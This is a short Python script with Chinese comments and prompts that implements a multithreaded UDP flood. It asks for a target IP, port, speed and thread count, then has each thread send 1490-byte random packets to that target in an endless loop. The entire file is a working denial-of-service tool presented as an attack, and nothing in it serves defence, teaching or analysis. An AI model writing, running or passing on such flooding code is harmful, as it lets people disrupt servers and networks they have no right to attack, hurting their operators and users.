import socket
import random
import threading
import time


# 多线程攻击函数
def attack(ip, port, sd, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            if sent % 1000 == 0:
                print(f"[线程 {thread_id}] 已发送 {sent} 个数据包到 {ip} 端口 {port}")
            time.sleep((1000 - sd) / 2000)
    except Exception as e:
        print(f"[线程 {thread_id}] 发生错误: {e}")
        sock.close()


# 用户输入信息
def get_user_input():
    ip = input("请输入 IP     : ")
    port = int(input("攻击端口      : "))
    sd = int(input("攻击速度(1~1000) : "))
    threads = int(input("请输入线程数    : "))
    return ip, port, sd, threads


# 启动多线程攻击
def start_attack():
    ip, port, sd, threads = get_user_input()

    for i in range(threads):
        threading.Thread(target=attack, args=(ip, port, sd, i + 1)).start()


if __name__ == "__main__":
    start_attack()
